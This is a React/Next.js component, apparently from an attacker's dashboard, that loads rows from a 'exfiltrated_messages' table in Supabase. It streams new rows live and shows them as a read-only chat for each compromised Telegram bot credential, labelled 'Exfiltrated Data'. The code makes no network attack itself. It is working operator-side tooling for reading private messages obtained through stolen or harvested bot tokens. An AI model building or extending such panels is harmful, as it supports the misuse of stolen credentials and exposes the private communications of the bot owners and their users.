"use client";

import { useEffect, useState, useRef } from "react";
import { supabase } from "@/lib/supabase";
import { LucideSend } from "lucide-react";
import type { Credential } from "@/app/page";

export default function ChatWindow({ credential }: { credential: Credential | null }) {
    const [messages, setMessages] = useState<any[]>([]);
    const bottomRef = useRef<HTMLDivElement>(null);
    const credentialId = credential?.id;

    useEffect(() => {
        if (!credentialId) return;

        async function fetchMsgs() {
            const { data } = await supabase
                .from("exfiltrated_messages")
                .select("*")
                .eq("credential_id", credentialId)
                .order("telegram_msg_id", { ascending: true });

            if (data) setMessages(data);
        }

        fetchMsgs();

        const channel = supabase
            .channel(`chat-${credentialId}`)
            .on(
                "postgres_changes",
                {
                    event: "INSERT",
                    schema: "public",
                    table: "exfiltrated_messages",
                    filter: `credential_id=eq.${credentialId}`,
                },
                (payload) => {
                    setMessages((prev) => [...prev, payload.new]);
                }
            )
            .subscribe();

        return () => {
            supabase.removeChannel(channel);
        };
    }, [credentialId]);

    useEffect(() => {
        bottomRef.current?.scrollIntoView({ behavior: "smooth" });
    }, [messages]);

    if (!credential) {
        return (
            <div className="flex-1 flex items-center justify-center bg-slate-200 text-slate-600">
                Select a chat to view exfiltrated messages
            </div>
        );
    }

    const displayName = credential.meta?.bot_username
        ? `@${credential.meta.bot_username}`
        : credential.meta?.chat_title || "Unknown Bot";

    return (
        <div className="flex-1 flex flex-col h-full bg-[#E5DDD5]">
            <div className="p-3 bg-white border-b shadow-sm flex items-center gap-3">
                <div className="flex flex-col min-w-0">
                    <span className="font-semibold text-slate-800 truncate">{displayName}</span>
                    <div className="flex items-center gap-2 mt-0.5">
                        <span className="bg-slate-200 px-1.5 py-0.5 rounded text-[10px] uppercase font-mono text-slate-600">
                            {credential.source}
                        </span>
                        <span className="text-xs font-mono text-slate-400">
                            ID: {credential.meta?.bot_id || credential.id.slice(0, 8)}
                        </span>
                    </div>
                </div>
            </div>

            <div className="flex-1 overflow-y-auto p-4 flex flex-col space-y-3">
                {messages.map((msg) => (
                    <div
                        key={msg.id}
                        className={`flex flex-col max-w-[70%] p-2 rounded-lg shadow-sm ${msg.sender_name === "me" || msg.sender_name?.toLowerCase().includes("bot")
                            ? "self-end bg-[#DCF8C6] rounded-tr-none"
                            : "self-start bg-white rounded-tl-none"
                            }`}
                    >
                        <span className="text-xs font-bold text-sky-600 mb-0.5">
                            {msg.sender_name || "Unknown"}
                        </span>
                        <p className="text-sm text-slate-800 whitespace-pre-wrap leading-snug break-all">
                            {msg.content}
                        </p>
                        <span className="text-[10px] text-slate-400 self-end mt-1">
                            {new Date(msg.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </span>
                    </div>
                ))}
                <div ref={bottomRef} />
            </div>

            {/* Input area (ReadOnly) */}
            <div className="p-3 bg-white border-t flex items-center gap-2 text-slate-400 text-sm italic justify-center">
                <LucideSend className="w-4 h-4" />
                <span>Read-only Mode (Exfiltrated Data)</span>
            </div>
        </div>
    );
}
